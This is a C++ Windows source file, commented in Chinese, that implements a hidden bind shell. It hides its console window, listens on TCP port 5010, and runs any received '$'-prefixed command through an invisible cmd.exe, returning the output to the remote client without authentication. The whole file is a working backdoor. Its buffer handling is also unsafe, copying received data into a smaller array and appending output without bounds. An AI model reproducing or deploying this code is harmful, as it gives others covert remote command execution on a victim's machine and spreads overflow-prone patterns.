#include <stdio.h>
#include<iostream>
#include<winsock.h>
//mingw编译命令 g++ -o xxx.exe xxx.cpp -lws2_32
#define MSG_LENN 5120
using namespace std;
int cmd(char *cmdStr, char *message)
{
    DWORD readByte = 0;
    char command[1024] = {0};
    char buf[MSG_LENN] = {0}; //缓冲区
 
    HANDLE hRead, hWrite;
    STARTUPINFOA si;         // 启动配置信息
    PROCESS_INFORMATION pi; // 进程信息
    SECURITY_ATTRIBUTES sa; // 管道安全属性
 
    // 配置管道安全属性
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
 
    // 创建匿名管道，管道句柄是可被继承的
	if( !CreatePipe(&hRead, &hWrite, &sa, MSG_LENN)) {
        return 1;
    }
 
    // 配置 cmd 启动信息
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // 获取兼容大小
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
    si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
    si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头

	// 拼接 cmd 命令
	sprintf(command, "cmd.exe /c %s", cmdStr);
    
    // 创建子进程,运行命令,子进程是可继承的
    if ( !CreateProcessA( NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi )) {
        CloseHandle( hRead );
        CloseHandle( hWrite );
		printf("error!");
        return 1;
    }
    CloseHandle( hWrite );

    /*BOOL ReadFile(
    HANDLE hFile, //文件的句柄
    LPVOID lpBuffer, //接收数据的缓冲区
    DWORD nNumberOfBytesToRead,    //读取的字节数
    LPDWORD lpNumberOfBytesRead,    //指向实际读取字节数的指针
    LPOVERLAPPED lpOverlapped
    //如文件打开时指定了FILE_FLAG_OVERLAPPED，那么必须，用这个参数引用一个特殊的结构。
    //该结构定义了一次异步读取操作。否则，应将这个参数设为NULL
);*/
    while (ReadFile( hRead, buf, MSG_LENN, &readByte, NULL )) {
        strcat(message, buf);//strcat(a,b)--->ab
        ZeroMemory( buf, MSG_LENN );
    }
    CloseHandle( hRead );

    return 0;
}

int main() {
	//Sleep(2000);//需要延迟，不然会报错
	ShowWindow(GetForegroundWindow(),0);
	//定义长度变量
	int send_len=0,recv_len=0,len=0;
	//定义发送缓冲区和接受缓冲区
	char send_buf[100]={},recv_buf[100]={};
	//定义服务端套接字，接受请求套接字
	SOCKET s_server,s_accept;
	//服务端地址客户端地址
	SOCKADDR_IN server_addr,accept_addr;
	WSADATA wsadata;
    WSAStartup(MAKEWORD(2, 2), &wsadata);
	//填充服务端信息
	server_addr.sin_family = AF_INET;
	server_addr.sin_addr.S_un.S_addr = htonl(INADDR_ANY);
	server_addr.sin_port = htons(5010);
	//创建套接字
	s_server = socket(AF_INET, SOCK_STREAM, 0);
	bind(s_server, (SOCKADDR *)&server_addr, sizeof(SOCKADDR));

	//设置套接字为监听状态
	listen(s_server, SOMAXCONN);

	//接受连接请求
	len = sizeof(SOCKADDR);
	s_accept = accept(s_server, (SOCKADDR *)&accept_addr, &len);
    char message[MSG_LENN+10] = {0};
	//接收数据
	while (1) {
        ZeroMemory(message,sizeof(message));
        ZeroMemory(recv_buf,sizeof(recv_buf));
		recv_len = recv(s_accept, recv_buf, 100, 0);
		if (recv_len < 0) {
            cout<<"fault"<<endl;
			closesocket(s_accept);
	        s_accept = accept(s_server, (SOCKADDR *)&accept_addr, &len);
            recv_len = recv(s_accept, recv_buf, 100, 0);
            Sleep(20000);
		}
        if (recv_buf[0]=='$'){
                int i;
                char CMD[30]={0};
                char c;
			    for(i = 1;(c = recv_buf[i])!= '\0';i ++) CMD[i-1] = recv_buf[i];
				cmd(CMD,message);
                send(s_accept, message, strlen(message)+1,0);
        }


	}
	//关闭套接字
	closesocket(s_server);
	closesocket(s_accept);
	//释放DLL资源
	WSACleanup();
	return 0;
}
